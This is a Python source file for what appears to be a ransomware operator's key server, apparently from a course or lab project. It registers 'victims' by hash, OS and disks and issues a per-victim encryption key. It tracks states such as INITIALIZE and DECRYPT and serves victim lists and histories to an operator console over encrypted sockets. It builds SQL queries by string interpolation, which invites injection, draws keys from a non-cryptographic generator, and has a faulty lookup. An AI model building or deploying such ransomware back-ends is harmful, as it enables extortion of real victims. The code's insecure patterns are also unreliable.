from threading import Thread
import queue
import string
import random
import utile.network as network
import utile.message
import utile.data as data
import utile.security as security
import utile.config as config
import time

# Load configurations
load = config.load_config('../configuration/config/serveur_cles.cfg', '../configuration/config/serveur_cles.key')
AES_GCM = config.get_config('AES_GCM')
DEBUG_MODE = config.get_config('DEBUG_MODE')
PORT_SERV_CONSOLE = int(config.get_config('PORT_SERV_CONSOLE'))
PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))


def generate_key(length=0, characters=string.ascii_letters + string.digits):
    """
    Generate a random key with given length and characters.
    """
    return ''.join(random.choice(characters) for _ in range(length))


def check_hash(db, victim_hash):
    requete = f'''
    SELECT victims.id_victim, victims.key
    FROM victims
    WHERE victims.hash = "{victim_hash}"
    '''
    v_key = data.select_data(db, requete)
    v_key = list(v_key[0])
    print(f"Victim with hash {victim_hash[-12:]} found in DB with ID {v_key[0]}")
    requete = f'''
    SELECT states.state, MAX(states.datetime)
    FROM states
    WHERE states.id_victim = {v_key[0]}
    '''
    v_key.append((data.select_data(db, requete))[0][0])
    return v_key


def add_victim(db, id, os, disk, key):
    """
    Add a new victim to the database.
    """
    date = int(time.time())
    data.insert_data(db, 'victims', '(os, hash, disks, key)', f'("{os}", "{id}", "{disk}", "{key}")')
    victim_id = data.select_data(db, f'SELECT id_victim FROM victims WHERE hash = "{id}"')[0][0]
    data.insert_data(db, 'states', '(id_victim, datetime, state)', f'({victim_id}, {date}, "INITIALIZE")')
    return victim_id


def handle_list_victim_request(db, fifo_db, fifo_rep_console):
    list_victim = utile.data.get_list_victims(db)
    for victim in list_victim:
        message = utile.message.set_message('list_victim_resp', victim)
        fifo_rep_console.put(message)
        fifo_rep_console.join()
    message = utile.message.set_message('list_victim_end')
    fifo_rep_console.put(message)
    fifo_rep_console.join()
    fifo_db.task_done()


def handle_history_request(conn_db, fifo_db, fifo_rep_console, msg):
    victim_id = msg['HIST_REQ']
    list_historique = utile.data.get_list_history(conn_db, victim_id)
    for historique in list_historique:
        msg = utile.message.set_message('history_resp', historique)
        fifo_rep_console.put(msg)
        fifo_rep_console.join()
    msg = utile.message.set_message('history_end', [victim_id])
    fifo_rep_console.put(msg)
    fifo_rep_console.join()
    fifo_db.task_done()


def handle_change_state(conn_db, fifo_db, msg):
    v_id = msg['CHGSTATE']
    print("state " + str(v_id))
    utile.data.insert_data(conn_db, 'states', '(id_victim, datetime, state)',
                           f"({v_id}, {int(time.time())}, 'DECRYPT')")
    fifo_db.task_done()
    print("State change finished")


def handle_initialize_request(conn_db, fifo_rep_front, msg):
    victim = check_hash(conn_db, msg['INITIALIZE'])
    if victim is None:
        key = generate_key(512)
        v_id = add_victim(conn_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key)
        victim = [v_id, key, 'INITIALIZE']
    message = utile.message.set_message('initialize_key', victim)
    fifo_rep_front.put(message)
    fifo_rep_front.join()


def main():
    """
    Main function of the program.
    Initializes the communication with the database, creates queues for requests,
    and starts threads to handle requests from the front-end and console.
    """
    conn_db = data.connect_db()
    fifo_db = queue.Queue()
    fifo_rep_front = queue.Queue()
    fifo_rep_console = queue.Queue()

    Thread(target=thread_front, args=(fifo_db, fifo_rep_front), daemon=True).start()
    Thread(target=thread_cons, args=(fifo_db, fifo_rep_console), daemon=True).start()

    while True:
        message = fifo_db.get()
        msg_type = utile.message.get_message_type(message)
        if msg_type == 'LIST_VICTIM_REQ':
            handle_list_victim_request(conn_db, fifo_db, fifo_rep_console)
        elif msg_type == 'HISTORY_REQ':
            handle_history_request(conn_db, fifo_db, fifo_rep_console, message)
        elif msg_type == 'CHANGE_STATE':
            handle_change_state(conn_db, fifo_db, message)
        elif msg_type == 'INITIALIZE_REQ':
            handle_initialize_request(conn_db,fifo_rep_front, message )


def thread_front(fifo_db, fifo_rep_front):
    """
    Thread function to handle requests from the front-end.
    Waits for requests, decrypts them, processes them, and sends responses.
    """
    cle_serv = network.start_net_serv(port=PORT_SERV_FRONTAL)
    while True:
        front_serv, _ = cle_serv.accept()
        key = security.diffie_hellman_send_key(front_serv)
        while True:
            msg = network.receive_message(front_serv)
            msg = security.aes_decrypt(msg, key)
            msg_type = utile.message.get_message_type(msg)
            if msg_type == 'INITIALIZE_REQ':
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg_type = utile.message.get_message_type(msg)
                if msg_type == 'INITIALIZE_KEY':
                    msg = security.aes_encrypt(msg, key)
                    network.send_message(front_serv, msg)
                    fifo_rep_front.task_done()

def thread_cons(fifo_db, fifo_rep_console):
    """
    Thread function to handle requests from the console.
    Waits for requests, decrypts them, processes them, and sends responses.
    """
    cle_serv = network.start_net_serv(port=PORT_SERV_CONSOLE)
    while True:
        console_serv, _ = cle_serv.accept()
        while True:
            key = security.diffie_hellman_send_key(console_serv)
            message = network.receive_message(console_serv)
            message = security.aes_decrypt(message, key)
            msg_type = utile.message.get_message_type(message)
            if msg_type == 'LIST_VICTIM_REQ':
                fifo_db.put(message)
                message = fifo_rep_console.get()
                msg_type = utile.message.get_message_type(message)
                while msg_type != 'LIST_VICTIM_END':
                    message = security.aes_encrypt(message, key)
                    network.send_message(console_serv, message)
                    fifo_rep_console.task_done()
                    message = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(message)
                message = security.aes_encrypt(message, key)
                network.send_message(console_serv, message)
                fifo_rep_console.task_done()
            elif msg_type == 'HISTORY_REQ':
                fifo_db.put(message)
                msg = fifo_rep_console.get()
                msg_type = utile.message.get_message_type(msg)
                while msg_type != 'HISTORY_END':
                    msg = security.aes_encrypt(msg, key)
                    network.send_message(console_serv, msg)
                    fifo_rep_console.task_done()
                    msg = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(msg)
                msg = security.aes_encrypt(msg, key)
                network.send_message(console_serv, msg)
                fifo_rep_console.task_done()
            elif msg_type == 'CHANGE_STATE':
                fifo_db.put(message)


if __name__ == "__main__":
    main()
